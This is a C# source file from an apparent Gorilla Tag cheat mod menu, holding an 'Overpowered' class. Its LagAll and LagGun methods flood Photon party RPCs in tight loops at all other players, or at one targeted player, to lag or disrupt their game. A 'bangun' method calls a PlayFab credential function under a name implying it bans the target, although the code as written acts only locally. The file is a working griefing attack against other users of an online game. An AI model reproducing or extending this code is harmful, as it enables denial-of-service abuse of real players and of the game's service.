using System;
using System.Collections.Generic;
using System.Text;
using static MenkerMenu.Utilities.GunTemplate;
using static MenkerMenu.Utilities.ColorLib;
using static MenkerMenu.Utilities.Variables;
using static MenkerMenu.Utilities.HandOrbs;
using static MenkerMenu.Menu.Main;
using static MenkerMenu.Utilities.RigManager;
using static MenkerMenu.Mods.Categories.Settings;
using static MenkerMenu.Mods.Categories.Safety;
using UnityEngine;
using static MenkerMenu.Mods.Categories.Guardian;
using UnityEngine.InputSystem;
using MenkerMenu.Utilities;
using UnityEngine.XR;
using UnityEngine.Animations.Rigging;
using UnityEngine.XR.Interaction.Toolkit;
using GorillaNetworking;
using MenkerMenu.Utilities.Patches;
using MenkerMenu.Menu;
using ExitGames.Client.Photon;
using Photon.Pun;
using Photon.Realtime;
using HarmonyLib;
using BepInEx;
using MenkerMenu.Utilities;
using GorillaTagScripts;
using System.Threading;
using PlayFab.ProfilesModels;
using System.Linq;
using System.Reflection;
using PlayFab;

namespace MenkerMenu.Mods.Categories
{
    public class Overpowered
    {
        public static void bangun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                if (GunTemplate.LockedPlayer)
                {
                    PlayFabAuthenticationAPI.ForgetAllCredentials();
                }

            }, true);
        }
        public static void LagAll()
        {
            bool flag = Time.time > r;
            if (flag)
            {
                r = Time.time + 0.11f;
                for (int i = 0; i < 25; i++)
                {
                    FriendshipGroupDetection.Instance.photonView.RPC("RequestPartyGameMode", RpcTarget.Others, new object[1]);
                    FriendshipGroupDetection.Instance.photonView.RPC("NotifyPartyGameModeChanged", RpcTarget.Others, new object[1]);
                    FriendshipGroupDetection.Instance.photonView.RPC("VerifyPartyMember", RpcTarget.Others, new object[1]);
                    FriendshipGroupDetection.Instance.photonView.RPC("PartyMemberIsAboutToGroupJoin", RpcTarget.Others, new object[1]);
                    FlushRPCs(0.56f);
                }
            }
        }
        public static void LagGun()
        {
            GunTemplate.StartBothGuns(() =>
            {
                bool flag = Time.time > r;
                if (flag)
                {
                    r = Time.time + 0.11f;
                    for (int i = 0; i < 25; i++)
                    {
                        FriendshipGroupDetection.Instance.photonView.RPC("RequestPartyGameMode", RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)), new object[1]);
                        FriendshipGroupDetection.Instance.photonView.RPC("NotifyPartyGameModeChanged", RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)), new object[1]);
                        FriendshipGroupDetection.Instance.photonView.RPC("VerifyPartyMember", RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)), new object[1]);
                        FriendshipGroupDetection.Instance.photonView.RPC("PartyMemberIsAboutToGroupJoin", RigManager.NetPlayerToPlayer(RigManager.GetPlayerFromVRRig(LockedPlayer)), new object[1]);
                        FlushRPCs(0.56f);
                    }
                }
            }, true);
        }
        static float r = 1f;
    }
}
